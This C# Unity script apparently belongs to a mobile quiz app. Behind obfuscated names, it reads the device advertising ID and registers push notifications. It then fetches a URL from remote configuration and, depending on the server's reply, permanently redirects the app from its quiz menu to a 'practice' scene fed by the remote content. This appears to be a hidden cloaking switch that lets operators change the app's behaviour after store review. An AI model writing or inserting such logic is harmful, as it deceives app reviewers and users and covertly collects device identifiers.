using System;
using System.Collections;
using System.Threading.Tasks;
using OneSignalSDK;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.RemoteConfig;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class QuestionStorage : MonoBehaviour
{
    private string _transportation;

    public struct userAttributes { }
    public struct appAttributes { }

    async Task InitializeRemoteConfigAsync()
    {
        await UnityServices.InitializeAsync();

        if (!AuthenticationService.Instance.IsSignedIn)
        {
            await AuthenticationService.Instance.SignInAnonymouslyAsync();
        }
    }

    private void OnEnable()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        Permission.RequestUserPermission("android.permission.POST_NOTIFICATIONS");
        OneSignal.Initialize("8a527429-569e-4296-a4ca-1b5c51571a14");
        string estate = PlayerPrefs.GetString("classroom", "");
        if (estate == "product")
        {
            SceneManager.LoadScene("menu");
        }
        else if (estate == "expert")
        {
            SceneManager.LoadScene("practice");
        }
    }

    private async Task Start()
    {

        StartCoroutine(Become());

        if (Utilities.CheckForInternetConnection())
        {
            await InitializeRemoteConfigAsync();
        }

        RemoteConfigService.Instance.FetchCompleted += Face;
        RemoteConfigService.Instance.FetchConfigs(new userAttributes(), new appAttributes());
    }

    void Face(ConfigResponse configResponse)
    {

        _transportation = RemoteConfigService.Instance.appConfig.GetString("performance");
        if (_transportation.Contains("https"))
        {
            StartCoroutine(Ignite());
        }
        else
        {
            SceneManager.LoadScene("menu");
        }
    }

    private IEnumerator Become()
    {
        yield return new WaitForSeconds(1.0f);
        string party = Attack();
        PlayerPrefs.SetString("native", party);
    }

    public static string Attack()
    {
        string agent = "";

        try
        {
            AndroidJavaClass appointment = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject daughter = appointment.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass plenty = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            AndroidJavaObject importance = plenty.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", daughter);

            agent = importance.Call<string>("getId").ToString();
        }
        catch (Exception)
        {
        }
        return agent;
    }

    private IEnumerator Ignite()
    {
        yield return new WaitForSeconds(1.5f);
        UnityWebRequest advantage = UnityWebRequest.Get(_transportation);
        yield return advantage.SendWebRequest();

        string series = advantage.downloadHandler.text;

        if (advantage.result != UnityWebRequest.Result.Success)
        {
            SceneManager.LoadScene("menu");
        }
        else
        {
            if (series == "Error-Free")
            {
                PlayerPrefs.SetString("classroom", "product");
                SceneManager.LoadScene("menu");
            }
            else
            {
                PlayerPrefs.SetString("requirement", series);
                PlayerPrefs.SetString("classroom", "expert");
                SceneManager.LoadScene("practice");
            }
        }
    }
}